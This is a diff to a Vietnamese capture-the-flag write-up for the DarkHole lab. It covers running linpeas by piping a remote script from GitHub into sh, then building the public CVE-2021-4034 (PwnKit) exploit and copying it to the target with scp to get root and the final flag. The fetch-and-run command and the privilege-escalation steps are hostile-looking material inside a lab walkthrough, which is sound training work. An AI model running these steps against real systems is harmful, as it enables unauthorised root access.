@@ -95,8 +95,23 @@ Sử dụng linpeas để check CVE. Command tại https://github.com/carlospolo
 
 >curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
 
-Có 2 CVE.. thử từng cái một thôi :)
+Có 2 CVE.. thử cái đầu xem nào :)
 
 ![image](https://user-images.githubusercontent.com/97771705/225817364-0d66ed5f-1b25-4608-b666-2b0a6aa667c0.png)
 
+Tìm thấy code exploit trên github https://github.com/berdav/CVE-2021-4034
+
+Down về rồi make, sau đó copy folder sang máy victim
+
+![image](https://user-images.githubusercontent.com/97771705/225852696-1d60a865-5979-4274-91a1-d6bdb9a14c59.png)
+
+>scp -r CVE-2021-4034-main/ jehad@192.168.77.250:/tmp
+
+![image](https://user-images.githubusercontent.com/97771705/225852060-8a499448-8a7b-43fa-b030-a30355df835f.png)
+
+![image](https://user-images.githubusercontent.com/97771705/225852121-121befeb-d093-47d5-b783-cee4fddd8e4b.png)
+
+Xin nhẹ flag cuối :) : DarkHole{'Legend'}
+
+![image](https://user-images.githubusercontent.com/97771705/225853055-9b774122-84b1-41ad-a7e8-32d8fa2a6ab3.png)
 
